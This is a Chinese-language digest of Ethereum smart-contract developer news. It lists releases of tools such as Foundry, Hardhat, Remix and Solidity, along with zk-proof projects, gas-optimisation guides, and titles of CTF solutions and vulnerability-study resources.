作战室急救包，Debugger Chrome 扩展工具\n\n\nApe v0.3.0: (合约开发框架) Geth 和 Parity风格的跟踪方法show_trace() ，新的缓存 APIs\n\n\neth_lift ethdiff:对比本地Solidity文件(Foundry 和 Brownie)与Etherscan验证源\n\n\nzk Soul-Bound token利用了Iden3 go库和Iden3电路。\n\n\nHardhat-circom v3.2.x: 与 Mocha 集成的电路测试，从 Groth16 和 PLONK snarkjs 绑定中导出调用数据\n\n\nSepolia测试网RPC\n\n\nSol Challenge: CTF挑战, TypeScript测试\n\n\nStErMi的EVM谜题解决方案\n\n\n用位域压缩优化Merkle 树gas\n\n\n反编译 未经验证的 MEV 机器人合约\n\n\n测试网关闭时间表: Kiln在主网合并后, Ropsten 第四季度, Rinkeby 2023年第二到第三季度\n\n\nSepolia 测试网水龙头\n\n\nEthereumJS VM v5.9.3 支持 Gray Glacier\n\n\nFoundry x Huff: 用 Foundry 编译并测试 Huff 合约\n\n\nNFT gas 优化 ，通过把元数据编码到 Token ID 实现\n\n\nDeFi Hacks: 用 Foundry 重现 DeFi 事件\n\n\nDamn Vulnerable DeFi (CTF) Foundry 版本已实现所有级别，这是学习进攻DeFi智能合约安全性的战争游戏，通过众多的挑战学习bug猎人或安全审计员的技能。\n\n\nNethereum v4.6.1 (.Net 库): MetaMask nuget 包, Humanity 的证明集成\n\n\nSolenv: 在 Foundry Solidity 脚本和测试中加载.env文件\n\n\nNader Dabit: Foundry 备忘单\n\n\n深入了解事件日志: 主题和布隆过滤器(Bloom filters)\n\n\nNFT 合约常见模式: 用计数器代替 ERC721Enumerable 节约 gas, 用 ERC721A 批量铸币, 用 mint 代替safeMint, 用 Merkle tree 实现准入列表(allowlists) , 可升级/可交换的元数据合约\n\n\n在 Solidity 中用位移验证国际象棋的国王/骑士移动\n\n\nDeFiVulnLabs: 常见漏洞的代码片段\n\n\nEVM 冷知识: 7个问题和答案\n\n\nwagmi v0.5 (Reach Hooks 库): 连接状态回调、多路调用和批量读取以及分页\n\n\n0xPARC: 用on-chain 程序化生成 和 Perlin Noise 创建游戏世界\n\n\nHardhat v2.10.0 + Hardhat Toolbox 插件包：部署和与 ethers.js 交互、用 Mocha 和 Chai 进行测试、与 Hardhat Network 交互、在 Etherscan 上验证、gas 报告、测试覆盖率和 TypeScript 的类型绑定\n\n\nVisual Studio Code 支持 Hardhat 测试版\n\n\nsurl（http 库）：从 Solidity 脚本和测试发出 Web 请求\n\n\nstack-packer: 为打包结构体生成一个编码器库代码， 在堆栈上（而不是memory或 storage）执行打包编码。\n\n\nFe v0.19.1-alpha: 返回嵌套结构，采用花括号，特性作为通用函数的边界，允许复杂类型作为数组元素\n\n\nmicro-web3: 最小的 web3.js 实现\n\n\nMetaMaskAPI 弃用 eth_decrypt 和 eth_getEncryptionPublicKey\n\n\nSemaphore v2: 创建隐私身份，将身份添加到组并发送匿名信号\n\n\nFlexible Voting 的灵活投票扩展，允许贷款合约委托投票，这样你就可以获得收益并同时参与治理\n\n\nERC721i: 预铸造 NFT 藏品，使用 ERC2309 ConsecutiveTransfer 定义的事件\n\n\nPRBTest: PRBTest：Solidity 的测试断言和日志工具，DSTest 的直接替代\n\n\nYul 合约创建指南: 将简单的 Solidity 合约转换为 Yul\n\n\nxchain: Solidity 测试和脚本中的跨链调用\n\n\n用 wagmi 和 Storybook 的自动化 web3 UI 测试\n\n\ncreate-web3（用于 dapp 项目的 CLI）：增加 CSS 框架的选择\n\n\nWalletConnect iOS App Link: 防止在触发钱包交互时出现问题\n\n\nWeb3.py 链下数据查询\n\n\n通过 Flashbots 拍卖深入探索内存池\n\n\n实时Calldata(调用数据)解码:GridPlus 的方法\n\n\nRemix v0.25.0: 克隆 Git 库，从 Etherscan 和 GitHub 打开 Solidity，Foundry 重新映射，用改进的provider标签进行部署\n\n\nsolady （gas优化的 Solidity 代码段），功能有：MerkleProof、ECDSA、Sort、Base64、LibString、LibBitmap 和 SafeTransferLib\n\n\nhuffmate (Huff 中的合约库): auth, data structures, math 和 tokens\n\n\nPaul R Berg 的 Foundry 模板，包含PRBTest, Forge Std, Solhint, Prettier, GitHub Actions 和 Conventional Commits\n\n\nNethereum v4.7.0（.Net 库）：新 Unity 库更好的支持 RPC 客户端适配器\n\n\nTenderly Gas 分析工具: 分析函数的gas使用情况\n\n\nOpenZeppelin Ethernaut CTF 的新UI; StErMi 的 Ethernaut 解法\n\n\nEthernaut DAO CTF car market 解法\n\n\nTincho: 深入了解发送 1 DAI 时发生了什么\n\n\nHuff 发布(用于合约gas优化的低级汇编语言)，包括编译器、Foundry库、项目模板、VSCode扩展和合约库(Huffmate)\n\n\nVyper 语言:\n\nv0.3.4: abi 解码, 枚举, uint2str, 支持 ERC5202 工厂模式\nVyper 举例\nVyperPunk: 用 Brownie 的 CTF\n\n\n\n验证链上的两个数互质\n\n\n用 ZK-Snarks 验证 ed25519 签名 , 研究项目\n\n\nganache v7.4.0: 支持 Hardhat console.log ，eth_getProof\n\n\nsol2uml v2: 加入合约存储槽(使用合约的存储值)可视化。\n\n\nslither-read-storage使用指南，检索存储槽，\n\n\nOptimism 的 Drippie: 基于如 Gelato 服务的链上自动运行\n\n\nethers-rs v0.17: 修复bug，更新文档\n\n\nevm-translator (TypeScript 库): 人类可读的交易, 用于社交网络\n\n\nevm-trace (Python 库): 交易跟踪\n\n\nApe v0.4.0: (Python 合约架构): 改进了对日志和跟踪的处理，添加了历史查询\n\n\nwagmi v0.6: 添加Prepare Hooks，在发送交易前准备交易\n\n\nNFT Embed: iFrame 小部件，用于通过Universe市场销售NFT\n\n\neth.limo 支持按需获取ENS子域证书\n\n\nEthernaut DAO CTF 售卖机解决方案\n\n\nFoundry 通过缓存字节码分析，模糊测试实现2倍加速\n\n\nTenderly Sandbox:浏览器中的原型合约\n\n\nweb3.js v1.7.5: 依赖项的安全更新、文档更新，修复bug\n\n\nsnekmate: Vyper 构建区块; ECDSA, CreateAddress, Create2Address 和 EIP712\n\n\nethp2p (Rust): 编码/解码原始 Eth p2p 消息\n\n\nConnectKit: React 组件连接钱包, 用 wagmi, 测试版\n\n\nEthernaut DAO CTF EthernautDAOToken 解决办法\n\n\nevm.elf: 有效的 EVM 和 Linux 二进制 (ELF) 代码\n\n\nBrainSTARK: 为 Brainfuck 语言设计图灵完备的 zk-STARK 引擎的指南\n\n\nGoogle Paranoid库: 检查加密部件(如公钥、数字签名和一般伪随机数)是否存在已知弱点\n\n\nSolidity v0.8.16: 修复了在calldata元组ABI-reencoding中头部溢出的bug;对加减法进行更高效gas的溢出检查\n\n\nVitalik 关于用隐形地址 （Stealth address）私下持有ERC721 NFT的想法\n\n\n指南：为生成高效合约地址找出是适合的 create2 salt\n\n\nm1guelpf 的 dapp-starter: 更新了浅色/深色主题, ConnectKit 和 wagmi v0.6\n\n\nBlocknative 交易分发网络: 向多个节点提交交易\n\n\nMEV bundle generator (用Rust实现) 开源: 基于graph, 带有定制的 Yul multicall\n\n\nEthernaut DAO CTF 可破解（hackable）合约解决方案\n\n\nFoundry 验证增加了对 Sourcify 的支持\n\n\nChainlink 的Huff 入门套件：用 Foundry 开发 Huff 合约\n\n\nERC721K: 使用数据流的动态链上 SVG NFT\n\n\n音乐 NFT IPFS 元数据：链上音乐元数据\n\n\nLanyard: 用于 NFT 白名单的 Merkle 根生成器\n\n\nSeaport 订单验证器:用单个 RPC 调用进行安全检查\n\n\n用销毁了的地址 或者 OpenZeppelin Defender 中继客户端部署合约\n\n\n合约自动化解决方案对比: Gelato Ops, Keep3r Network, Chainlink Keepers 和 Open Zeppelin Defender\n\n\nethers.js v5.7.0: 修复和改进\n\n\nEtherface: 带有源链接的签名数据库，爬取GitHub/Etherscan/4Byte\n\n\nRainbowKit 支持用以太坊 + NextAuth.js 登链\n\n\n用mutants改进静态分析: 和使用Securify &amp; SmartCheck 的 Slither 对比\n\n\nEthernaut DAO CTF switch挑战 解题方案\n\n\n可变利率渐进式荷兰式拍卖：用自定义时间表出售 NFT\n\n\nChuff（Huff 公共事业合约）：可拥有且安全的数学\n\n\n可委托钻石合约：将可委托框架添加到 ERC2535 合约\n\n\nMaurelian 的 Solidity沙盒：基于repo，用于简单的编写和测试玩具合约\n\n\n用 Docker设置 PoS 开发网络（Prysm+Geth）\n\n\nTruffle v5.5.28 : Truffle Dashboard 更快，夜间模式\n\n\ntitanoboa（Vyper 解释器）用户可定义的预编译\n\n\nNethereum v4.8.0：支持钱包 RPC 方法、批处理 RPC、AWS Key Manager 外部签名者、支持 EIP712 JSON ， ENS unicode\n\n\n通过“convex optimization”进行MEV CFMM 套利\n\n\n合并后的MEV 搜索\n\n\nOxPARC zkPairing：Circom 中椭圆曲线配对的概念验证实现\n\n\nParadigm CTF 0xMonaco：使用合约的资源管理 PvP 赛车游戏；第一名和第二名的记录+（已修补）利用单回合获胜\n\n\nHardhat v2.11.0：合并后测试合约和快速编译\n\n\nRemix v0.26.0：编辑器自动补全，在行内标出错误，跳转到定义，gas估算；改进合约部署选择器；Vyper 插件升级，可以一键克隆 vyper-lang repo\n\n\nFoundry fork 测试设置、模糊测试和不变(invariant)配置以及文件读/写指南\n\n\ntitanoboa（Vyper 解释器）主网分叉\n\n\nweb3.js v4.x alpha：Typescript 重写，v1.x 功能；迁移到web3 GitHub\n\n\nOtterscan v2022.08.03：检查点同步、部分 Sourcify 匹配，修复 ENS 表情符号的问题\n\n\nQuay：用 Rust 实现的Seaport 市场合约的后端API，MIT许可\n\n\nholders.at : NFT 持有者在特定区块的快照，可共享\n\n\n用指向 IPFS 的动画 URL 在 OpenSea 上构建应用 NFT\n\n\n为Layer 2 优化合约中 calldata 的使用\n\n\nzkPIN：用 zkSNARKs 构建的的承诺池\n\n\nSolidity v0.8.17：修复存储写入删除错误，更有效的乘法溢出检查，语言服务器默认分析所有文件\n\n\nSolidity 版本和EVM 操作码按主网上的使用情况排序\n\n\nEthereumJS发布：重点是 本地 BigInts, 合并默认硬分叉, Trie 修剪, 纯粹的非开销EVM, 审计依赖加密库 等等\n\n\nFoundry：JSON 解析、格式化、部署脚本中的私钥模式、0-day 补丁\n\n\nethers.js 更新：v6 分支，支持 “safe” 和 “finalized” 标签，修复 ENS 的 unicode ，操作被拒绝的错误代码\n\n\nApe v0.5.0（Python 合约框架）：自动 Etherscan 验证、交易返回值，查询区块和事件的属性\n\n\nfasteth：以太坊 JSON RPC 的异步 Python 库\n\n\n逐步所有权优化（GOO）：从 NFT 发行可替代代币并激励用户按比例持有两种代币\n\n\nCloud-ZK：在 AWS 云中用 FPGA 进行 zk-proof 的工具包\n\n\nSecureum A-MAZE-X CTF 挑战和解决方案\n\n\nOpenZeppelin 升级插件增加了对存储间隙的支持\n\n\nEtherscan将于10月5日弃用 Rinkeby 和 Ropsten 测试网浏览器\n\n\nhardhat-ignore-warnings：插件，用于将 warning 转为 error ，忽略不需要的警告\n\n\nweb3.js v1.8.0：PoS 所需的安全和最终区块标签\n\n\nABIType : ABI 和 EIP712 类型数据的严格 TypeScript 类型\n\n\nhardhat-vite : 插件，用于包装 Vite 以配置和启动 dapp\n\n\np5.js &amp; three.js已部署在链上\n\n\nframe.tools : 发布基于网络的链上艺术\n\n\nxPARC circom-batch-ECDSA：基于circom-ECDSA 的概念证明\n\n\nCircomspect : zk 证明的静态分析\n\n\nI am the chad v1 : 比赛中的 gas 优化比赛中的最佳\n\n\nParadigm CTF 文件发布\n\n\n关于自定义错误的 Ethernaut Good Samaritan 关卡\n\n\nexecTransaction：允许 NFT 合约所有者执行任何交易的模式，如果合约管理用户资金，请勿使用\n\n\nWhitenoise CTF优化关于 Optimism 的挑战\n\n\nImpersonator：在 iFrame 中添加查看 dapp 模拟地址\n\n\nEmbed.Art：用于社交媒体的可共享 NFT 页面，支持 SVG\n\n\nMockthereum：模拟一个节点或代理一个实际的节点\n\n\nZerokit v0.1：Rust 的 zk 库，RLN 模块，用 Rust API 或 C FFI，beta\n\n\nIsokratia：使用递归 SNARK 进行链下投票的信任最小化治理，概念证明\n\n\nSolbase (Solidity 库): 添加 ERC2612 permit 扩展为 ERC20/721/1155\n\n\nSolidity 数组生成器: Solidity 函数生成均匀间距数组，线性空间，范围，对数空间，设计用于测试，没有优化\n\n\nBit Magic: Solidity 里的位操作指南\n\n\nPaul R Berg 的 Solidity 小贴士: 带有命名形参的函数调用\n\n\nGitHub Action ，用 Remix 运行 Solidity 单元测试\n\n\nVyper v0.3.7: 内置isqrt &amp; epsilon , block.prevrandao, public 常量 ， 不可变变量\n\n\nSerpentor: Vyper 链上投票与治理合约\n\n\nHuffmate v1: Huff 合约库, 未审计\n\n\nevm2:在EVM内部运行的EVM\n\n\nctc v0.3.0: Python 包与历史数据分析CLI\n\n\nWhatsABI: 通过 4 字节的 JUMPI 指令从地址猜测 ABI; web app\n\n\nHeimdall v0.1.5: 增加反编译, 生成ABI函数,事件和错误, beta版本\n\n\nVitalik 的 Py_plonk: Python 的 SNARK (PLONK) 编译器, 检验器和验证器\n\n\nRaul Jordan: 函数式编程入门\n\n\nEthernaut DAO CTF vulnerable NFT 解决方案\n\n\nReminder: Rinkeby 和 Ropsten 测试网被弃用, 用 Goerli 和 Sepolia\n\n\nRemix v0.27.0: 用Remixd编译同步 HardHat/Truffle/Foundry , OpenZeppelin 模板定制，自动完成导入语句和代码格式化\n\n\nFoundry Canary: 示例部署脚本\n\n\nRemco exp &amp; ln: Solidity 中的指数函数和自然对数\n\n\n0age 提示: 用编译器 irooptimized 设置查看你的 solidity 的 Yul 汇编\n\n\n有用的 Solidity 模式: 包含 Foundry 测试的独立示例\n\n\nCREATE3 Factory: 部署一个地址基于部署器和 salt 的合约\n\n\nHyVM: Huff 中的 EVM Hypervisor，允许任意字节码执行\n\n\nsamczsun 的交易查看器; 前端开源\n\n\nEthereum utils: 单位转换, 校验和, 十六进制 ， Keccak256\n\n\n用 Echidna 进行模糊处理的指南，尝试打破用户定义的不变量\n\n\nTranspose SQL: 直接 SQL 访问索引区块链数据\n\n\nMEV 模板: 用 Rust 的 MEV bot\n\n\nSlither v0.9.0: 增加了 arbitrary-send-erc20、arbitrary-send-erc20-permit 和 domain-separator-collision 检测器，减少了误报\n\n\nNoir: Aztec 的基于 Rust 的语言，用于创建和验证 zk 证明\n\n\nCircom-Next-Starter: zk 应用程序启动工具包使用 Hardhat, Circom, Snarkjs 和 Nextjs\n\n\nFoundry inspect ir-optimized: 使用用Solidity代码，并显示优化的 Yul 汇编\n\n\ntincho 关于 用 Foundry 进行模糊测试 的介绍\n\n\nAuction Zoo: 用 Solidity 实现封闭出价的第二价格拍卖(Vickery拍卖)\n\n\nSimon de la Rouviere: 创建链上 SVG 胶囊艺术 NFT\n\n\nBytepeep: 最小字节码peephole优化\n\n\nI am the chad v1: gas 优化挑战 当前的冠军 和 亚军\n\n\nBlockSec Phalcon 交易浏览器为特定区块和次序交易添加模拟\n\n\nABI parser: 为通过验证的合约的事件和函数生成 BigQuery SQL\n\n\nwagmi v0.7 (React hooks): 根据 ABI 和 EIP712 类型化数据定义推断类型\n\n\nReCap: 用以太坊扩展登录来添加授权\n\n\n用 Foundry 和 React 前端构建 Uniswap v3 克隆的指南\n\n\nUniStark: 用 Warp 将 Uniswap v3 转成 Cairo（也进行了手动修改）, 通过测试\n\n\nMaze: 为 Circom-PLONK 证明生成聚合证明的命令行工具\n\n\nnplate: Noir 项目的极简模板\n\n\nOpenZeppelin 合约 v4.8: 批量ERC721铸造降低gas成本，投票gas优化，两步所有权转让，log2/10/256函数在 Math 库中可用，TimelockController ， ERC4626 计算更新为不使用小数\nOpenZeppelin 合约 Wizard 添加下载 Hardhat 开发包\nRemix v0.28: 在文件资源管理器和更新的home选项卡中管理Git分支\nFoundry 格式化和gas快照预提交Hook\nWhitenoise CTF 2使用了EIP1153 (临时存储操作码)\nRareSkills gas 谜题解决方案: Sqrt, ERC165\nNorswap: 如何用哈希进行链上洗牌，默克尔树和简单的zk-证明\nConnectKit v1.0.0 (React 组件连接钱包): 添加了支持以太坊登录, avatar 组件和Nouns主题\nZk-starter: 使用 circom 和 Foundry 创建具有相应Solidity合约的算法电路\n\nSolplot：用Solidity绘制图表的 Foundry 插件\nPrettier Solidity v1.0.0（用于格式化 Solidity 的 Prettier 插件）：第一个稳定版本\n部署在主网上的 Uniswap Permit2 和 Universal Router合约，Optimism 和 Arbitrum：\n\nPermit2：任何 ERC20 代币的授权、期限授权、基于签名的转账和批量授权、转账和撤销授权\n通用路由器：在单个swap路由中的进行 ERC20 和 NFT 兑换\n\n匿名 Vickrey 拍卖：向未初始化的CREATE2地址发送竞标，概念证明\nPaul Berg：时间戳变量为 uint40（大约 35k 年后）而不是 uint256 ，为了节省 gas\nSSX (Self-Sovereign Anything)：以太坊登录 (SIWE) 集成库，用于用户身份验证、会话管理和用户指标\ncreate-wagmi CLI：带有 Next.js、RainbowKit、ConnectKit 和 Vite 模板的项目启动器\nBigQuery 自定义事件数据提取指南，查询不在默认公共数据集中的事件\nreact-native-helios：React Native 包装器将 a16z 的 Helios 轻客户端嵌入到移动应用程序中\nminiSTARK : GPU 加速的 STARK 验证器\nNova Scotia：使用 Circom 电路和微软 Nova 验证器的中间件\n\nHardhat for VS Code v0.6.0：对 Foundry 和 hybrid 项目的实验性支持\nProof 的 Solidify：golang + Solidity 库，用于在链上存储任意数据\nRolodETH：带有名称和标签的地址数据库\nDnum：用于大数的 TypeScript 库\n用 React + Express + SSX 构建一个 DAO 身份验证app的指南\nOPCraft：构建链上体素（体素表示三维空间中规则网格上的值，类似2D位图中的像素）世界\nNorswap：使用 zk 证明进行洗牌和加密的心理扑克\nEchidna v2.0.4（合约模糊测试工具）：在 HTML 中添加覆盖率报告\n用 halo2 Rust crate构建 ZK SNARK 电路的指南\nRopsten 测试网正在关闭，接下来是 Rinkeby；应用开发应该使用 Sepolia\nPRBMath v3：用户定义的值类型 SD59x18 和 UD60x18，自由函数（在合约之外定义），用于 Foundry 测试的类型断言，MIT 许可证\nBlacksmith：产生与Foundry项目中的合约互动的前端\nFoundry &lt;&gt; Python 微分模糊测试模板：对量化金融合约开发有用\nRareSkills 40 道限时 Solidity 测试选择题；Tincho 完成了 77.5%\n合约构建和部署指南\nEVM 的结构和访问方式的存储图示\nevmc：从 Etherscan 获取经过验证的 Solidity 并加载到 IDE 中\ninterface.fyi：主网合约UI，包括未验证的和没有ABI的合约\n使用 GitHub Actions、Hardhat 和 OpenZeppelin Defender 的示例合约部署管道概念证明\nBasement API：获取合约、钱包和 NFT 数据\nLiberte：用你自己的节点替换 Infura\nSolidity路线图和开发者调查\nFe（语言）漏洞赏金竞赛，通过一个bug 破解了 15-puzzle\n合约部署者测试网ETH，一次领取 10 Sepolia 和 Goerli ETH\n3D 过山车：链上生成，概念验证\n初学者开发者资源列表\nSol2uml v2.3.0：（来自 Solidity 的 UML 生成器）添加了压缩功能\nsamczsun 的abi-guesser：用于猜测 ABI 编码数据类型的 TypeScript 库\n用 VanillaJS 通过 MetaMask与合约交互指南\nGrim-reaper：Huff 中的 Aave v3 链上清算机器人\nOptimism 的BaseServiceV2：长期运行的 TypeScript 服务的基类\nReact-native-helios：Helios 轻客户端的包装器，可在 Expo 中运行\nSemaphore boilerplate：供用户创建 ID 和留下反馈的 Web 应用程序组件；演示\nSepolia 测试网登陆页面：RPC、检查点同步、浏览器和规范\nForge-std v1.2.0 (Foundry)：加速 via-ir 编译，绑定整数和环境变量默认值的作弊代码，获取文件/文件夹元数据并暂停 gas 计量\n在 GitHub Actions 中用特定区块编号的 Foundry 分叉测试可以缓存 RPC 响应\nRemix v0.29.0：调试器在编辑器中显示 gas 使用情况，悬停时显示变量值，多签工作区模板，简体中文用户界面，格式化配置， remixd 已更新\nOtterscan v1.29.0：可选的信标链集成\n蜜罐合约：通过示例回顾常见陷阱\n针对常见陷阱的审计启发式方法\nSol2uml v2.4.0添加了已验证合约的扁平差异\n用 RainbowKit 和 wagmi 创建一个NFT 检查余额 React hook\nSELFDESTRUCT 被弃用, 避免使用它，因为功能会改变\nSolarray: 帮助工具，在一行代码里初始化动态数组，对Foundry测试很有用\nQuickpoc: 使用Foundry为一个经过验证的主网合约（包括依赖）创建一个沙盒\nBash Foundry helpers: 方便的方法和别名\n使用 Foundry 探索升级合约 通过实现一个 basic proxy\nSolidity 存取打包 概览\nNexth: 含有Chakra UI、TypeScript、ConnectKit和wagmi的Next.js入门开发套件\n指南： 理解交易 calldata 数据\nTrueBlocks docker: 本地索引及数据访问，beta版\nSourcify-snap: MetaMask snap 显示函数NatSpec（来自Sourcify)\nFleek Non Fungible Apps: 具有关于应用程序的链上元数据的NFT，概念验证\nGo-waku v0.3.0: 增加了新的协议节点更换和设备配对\n钱包开发者会议摘要\nFoundrychisel：Solidity REPL\nEtherscan 合约验证 API 添加失败消息\nUniswap Poor Oracle：闪电贷证明 Uniswap v3 价格超出范围的预言机\nERC2535（钻石）上的 Norswap：仅用于规避合约大小限制\nFallback(回退)：在 Solidity 中创建 Web 应用程序，概念验证\nHuff-immutables：在 Huff 中用构造函数初始化的不可变对象\nVSCode Solidity Inspector v0.0.3：查看合约存储布局\n了解EVM 指令边界以及EVM 正则表达式反编译器（Perl 兼容正则表达式）\nNoble-curves：JavaScript 中的椭圆曲线，零依赖\nWagmi (React hooks) v0.10.0：支持 WalletConnect v2 和 useWatchPendingTransactions 钩子\nENS 配置文件 API：通过 GraphQL 访问\nSolidity 编译器将附加合约元数据的 IPFS 编码哈希到字节码进行验证\nPrevRandao 使用指南\nPaul Berg：Solidity 支持函数作为参数，在测试中很有用，例如Seaport\nEVM 操作码的奇怪和意外行为，如何在 Solidity 和 Vyper 中处理它们\n设置 remixd，将 Remix 与本地文件系统一起使用\nCTF 挑战：\n\nMr Steal Yo Crypto，使用 Hardhat\nHappyNewYear CTF\n该死的易受攻击的 DeFi后门解决方案\n商店拼图和解决方案\nSecureum bootcamp race #13 的测验解决方案\n\n\nTurboETH：dapp 构建系统、app 模板、ERC20 和 ERC721 组件和钩子，测试版\n用 TrueBlocks查找某个地址创建的所有合约\n指南：用Z3定理证明器来做等价性检查，证明基于 Solidity 的 MulDiv 对于参考模型的正确性。\nUniRep 协议：私有和不可否认的信誉系统\nHardhat 和 Foundry 插件v1\nFoundry 工具链现在可以在 CI 流中缓存 RPC 调用\n如果你在2022年11月15日之前已经将合约部署到 Mainnet、Goerli 或 Sepolia，你可以领取 10 goerli + 10 sepolia eth\nChugsplash：安全部署和升级智能合约的工具\nTurborepo 入门套件：NextJS、WAGMI、Ethers、Tailwind、Hardhat、Typechain\nPaul Berg 关于解决堆栈太深的问题\n现在有超过225 个合约可以分叉并轻松部署在 Cookbook.dev 上\n节点健康监控工具\nFoundry：\n\nFoundry最佳实践， 中文版\nforge -std v1.3.0：InvariantTest 辅助合约、Multicall3 接口、 getTokenBalances 辅助程序、StdChains 链别名、parseJson 、 assumePayable 欺骗代码、小数断言\n不变量测试：实验示例代码库 ，另请参阅 Maple Finance不变量测试\nforge doc：使用 natspec 的文档生成器，输出 markdown\n\n\n即将发布的 Solidity v0.8.18 中用户定义运算符的预览\nFe language bountiful 第二轮漏洞赏金大赛\nYul初学者指南（中间语言）\n合约反编译指南，使用 heimdall-rs（反编译器）实现\nSolidity-merkle-trees：用于验证 Merkle 树的多重证明的 Solidity 库\nERC5267 演示网站检索 ERC712 域\nThe Graph增加了对 Arbitrum 和 Optimism的支持\nFoundry：\n\nChugSplash Foundry：部署和管理可升级合约，升级 OpenZeppelin 透明代理，支持主网和 Optimism\n在测试中deal 作弊码铸造 ERC20 代币\n\n\nEVM 调用 gas 消耗（2300 gas）的解释\nOpenZeppelin提议用虚拟份额和资产 减轻 ERC4626 通货膨胀攻击\nSparse-arr-lib：用于稀疏数组的 Solidity 库，仍在进行中\n通过石头剪刀布合约示例讲解用 Yul 优化 gas 消耗\nSamczsun 的签名数据库：可导出，通过 GitHub 添加到规范列表\nClipshot：ERC1155 代币持有者快照 CSV\nHydralisk：用于批量创建钱包的 Python CLI\n为 MEV 抢跑机器人构建陷阱的演练\nDamnVulnerableDefi 挑战 ABI smuggling 解决方案\nUniswap v3 数学 解释\ncommitment schemes 承诺模式 介绍\nZK 在线课程: modern zk cryptography 及 zk proofs\nOutlier Ventures 发表: 哪些产品需要代币\n\n\n\nSolidity v0.8.18：Paris 默认 EVM 版本，添加 block.prevrandao 并弃用 block.difficulty，添加 flag 以不附加 CBOR 元数据，弃用 selfdestruct 并改进 Yul 的字节码生成\n\n\nCodeslaw : 搜索经过验证的合约\n\n\nERC721X : ERC721 扩展， 30 天后自动过期转移授权\n\n\nSolidity 库指南\n\n\nApe v0.6.0（Python 合约框架）：测试版支持 Multicall3 ，添加了每个函数的编码/解码方法及在嵌套子目录中运行脚本\n\n\nMatchboxDAO 的 0xMonaco 比赛项：第一、第二、第三和取消资格的漏洞利用者\n\n\nSecureum RACE #14：8 个 Solidity 测验和答案\n\n\n用 Ape 和 Vyper 的 CTF 解决方案：Ethernaut，该死的易受攻击的 DeFi和EthernautDAO\n\n\nSMTChecker + Hardhat 使用指南\n\n\nHalmos：符号测试重用 Foundry 测试进行形式验证\n\n\nWagmi CLI（React hooks）：生成代码，连接到 Foundry/Hardhat 项目并创建插件\n\n\n通用桥：用官方桥向受支持的网络发送消息的通用接口\n\n\nzkLLVM 编译器：C/C++ 等语言的电路编译器\n\n\nSpartan-ecdsa：在 5 秒内验证 zk 中的 secp256k1 ECDSA 签名，在浏览器中证明\n\n\n添加到 Nova 和 Nova Scotia 的浏览器内递归证明和验证\n\n\nRemix IDE v0.30.0：Solidity 单元测试显示回退原因，ERC20 模板扩展了 Solidity 单元测试示例，查看编译器输入，添加了 Mocha Chai 测试和 Slither GitHub 工作流，并添加了 Flatten 和生成 UML 作为内部插件\n\n\nFoundry:\n\nFoundry Book：不变量测试指南\n用覆盖率槽可视化 Foundry 测试中的代码覆盖率\n在 Foundry 中对有序的 Solidity 数组进行模糊测试\n\n\n\nHardhat v2.12.7：具有相同时间戳的块的 Hardhat 网络选项、支持 http_proxy 环境变量、通过 WebSocket 的批处理请求以及优化器运行的配置验证\n\n\nSolidity 编译器通过在运行时字节码中包括仅在构造函数中调用的库函数，使部署变得臃肿\n\n\nPRBMath v3.3.0：添加类似 Rust 的类型转换\n\n\nNFT 随机性的Epoch 提交/揭示\n\n\nERC20Emit : 在事件中实现 ERC20 逻辑，不要在生产中使用，注意 Solidity 对事件参数的评估顺序\n\n\n文件模式：调度多个 setter 的单个 Solidity 函数\n\n\n可升级合约中存储的存储结构模式\n\n\n查询存储槽：用于读取 ERC1967 和自定义代理存储槽的 Web UI\n\n\nFoundry 中的Mr Steal Yo Crypto CTF 解决方案\n\n\n用 Halmos 符号测试的EVM 难题解决方案\n\n\nSlither Printers显示/输出合约信息，如功能摘要和继承\n\n\nPalla 的zk 证明编码介绍：通过剪刀石头布讲解 Circom、Halo2 和 Noir\n\n\nSemaphore v3：用于创建项目的 CLI，用于部署 Semaphore 合约和演示的 Hardhat 插件\n\n\nFoundry:\n\nforge-std v1.4.0：默认包含不变量测试助手，Create2 助手和禁用回退到默认公共 RPC 的标志\nFoundry不变量测试指南，以使用 WETH 为例\n使用 ignored_error_codes 配置选项忽略 Solidity 警告\n用状态树组织单元测试\n\n\n\nSeaport v1.3：修复代币转移后的zone检查，防止过滤原生代币，更高效的批量上架\n\n\nNFT 指数荷兰式拍卖(NFTEDA) ，Solidity 实现指数价格衰减\n\n\nAlchemy：通过帐户抽象设计，解释为什么 ERC4337 如此复杂\n\n\nSolhint v3.4.0：在映射中的命名参数添加规则，禁止 console.sol ，全局导入\n\n\nSolplate：使用 Rust 脚本生成 Solidity 合约模板\n\n\nFe语言赏金挑战：增加了两个挑战\n\n\n合约的 SMTLIB2 表示与 SMT 求解器一起使用的指南\n\n\nsamczsun 的ABI 工具：解码/编码交易数据\n\n\nABI 数据：从 Etherscan 获取和缓存合约 ABI 的 API\n\n\nQuix NFT 交易市场开源，Next.js/React 前端, Django 后端\n\n\nyGenius：使用 gpt_index 库将知识库连接到 GPT\n\n\nYuga Labs Dookey Dash 有技巧的 mint 游戏作弊和机器人\n\n\nSolidity v0.8.19：为用户定义的值类型添加运算符并修复部署膨胀问题（仅在创建代码中使用的代码包含在运行时字节码中）\n\n\n改进 try/catch的 Solidity 建议，需要反馈\n\n\nFoundry：\n\n配置SMTChecker\nTestnet.fyi：使用 Anvil 和 AWS 的短期无服务器测试网即服务，概念证明\n\n\n\nSolidity 中的统计近似\n\n\nAztecConnectAuction：使用 Aztec Connect 的跨链密封投标拍卖\n\n\nSolidity 外部库 Blur 空投申领者花费 34,000 美元，每个内部库可以节省约 2600 gas\n\n\nHuffmate v1.1（Huff 中的合约库）：SendEthers 实用程序、ECDSA 和 BytesLib 实现\n\n\nEVM 反汇编指南：导航元数据以及为什么字节码 6142 会破坏大多数反汇编程序\n\n\nsol2uml v2.5.0 : 解析在合约存储图中存储变量\n\n\nContractReader.io添加实时内联值\n\n\nSeaport v1.4：修复 v1.3 问题，以便在转移后应用区域和合约报价者检查\n\n\nAlchemy Create Web3 Dapp：基于 NextJs 的入门套件，包含组件和模板\n\n\nEmojimon：使用 MUD 堆栈创建以 Pokémon 为灵感的链上游戏的指南\n\n\nEKO2022 CTF Phoenixtto 解决方案\n\n\nHuff 中的Ethernaut CTF解决方案（使用 Vyper 的解决方案）\n\n\nGitcoin Passport Scorer API：基于passport分数的gate 应用\n\n\nRust 中的SuperNova实现，实验性\n\n\nHardhat v2.13.0：支持 ES 模块 (ESM) ，对 solc 基于 IR 的编译管道支持更友好\n\n\nRemix v0.31：分叉主网/测试网/自定义网络，检查 UUPS 合约的存储布局不兼容性、备份文件/文件夹、UML 缩放和 Remixd 